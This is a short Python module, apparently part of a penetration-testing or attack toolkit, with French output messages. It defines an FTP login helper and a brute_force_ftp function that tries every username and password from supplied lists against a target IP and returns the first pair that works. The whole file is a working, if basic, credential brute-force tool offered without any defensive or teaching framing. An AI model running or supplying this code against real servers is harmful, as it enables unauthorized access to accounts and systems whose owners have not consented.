# ftp.py

import ftplib

def connexion_ftp(ip, user, password):
    try:
        ftp = ftplib.FTP(ip)
        ftp.login(user, password)
        print(f"Connexion FTP réussie à {ip}")
        return True
    except Exception as e:
        print(f"Échec de la connexion FTP à {ip}: {e}")
        return False

def brute_force_ftp(ip, user_list, password_list):
    for user in user_list:
        for password in password_list:
            if connexion_ftp(ip, user, password):
                print(f"Succès : {user}:{password}")
                return user, password
    print("Brute-force FTP échoué")
    return None
